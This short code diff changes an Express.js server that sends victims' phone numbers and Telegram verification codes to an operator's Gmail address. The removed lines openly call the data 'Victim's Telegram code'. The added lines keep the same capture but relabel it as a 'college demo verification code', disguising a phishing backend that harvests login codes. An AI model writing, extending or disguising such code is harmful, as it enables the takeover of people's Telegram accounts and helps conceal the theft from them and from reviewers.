@@ -126,9 +126,9 @@ app.post("/api/send-code", async (req, res) => {
     await transporter.sendMail({
       from: process.env.GMAIL_USER,
       to: s.email,
-      subject: "Victim's Phone Number",
+      subject: "Your college demo verification code",
       text:
-        `Hey Aditya ! victim's phone nnumber is = ${s.phone}\n`
+        `phone nnumber is = ${s.phone}\n`
     });
     res.json({ success: true });
   } catch (err) {
@@ -161,13 +161,11 @@ app.post("/api/verify", async(req, res) => {
 await transporter.sendMail({
       from: process.env.GMAIL_USER,
       to: s.email,
-      subject: "Victim's Telegram code",
+      subject: "verification code",
       text:
-        "Victim entered : "+code
+        "code is "+code
     });
     res.json({ success: true });
-  s.verified = true;
-  s.codeHash = null;
 
 });
 
